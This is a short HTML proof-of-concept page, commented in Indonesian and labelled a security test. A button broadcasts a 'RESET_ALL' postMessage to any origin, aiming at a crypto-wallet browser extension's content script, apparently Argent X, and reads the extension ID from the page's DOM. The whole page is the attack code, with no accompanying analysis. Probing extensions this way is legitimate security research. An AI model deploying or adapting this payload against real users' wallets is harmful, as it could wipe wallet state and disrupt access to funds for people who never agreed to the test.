<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC dApp Wallet Interaction</title>
</head>
<body>
    <h1>Security Test Interface</h1>
    <button id="btnReset" style="padding: 20px; background: red; color: white;">Trigger RESET_ALL</button>
    <pre id="log" style="background: #eee; padding: 10px;"></pre>

    <script>
        const log = (msg) => document.getElementById('log').innerText += msg + '\n';

        document.getElementById('btnReset').addEventListener('click', () => {
            // Target: MiscenalleousMessage seperti yang terlihat di 1000163978.png
            const payload = {
                type: "RESET_ALL",
                // Terkadang diperlukan extensionId jika listener melakukan validasi asal
                extensionId: document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown"
            };

            log("Mengirim pesan: " + JSON.stringify(payload));

            // Mengirim ke seluruh jendela (window)
            // Dalam dApp browser, window.postMessage sering dipantau oleh content script wallet
            window.postMessage(payload, "*"); 
            
            log("Pesan telah dikirim.");
        });
    </script>
</body>
</html>
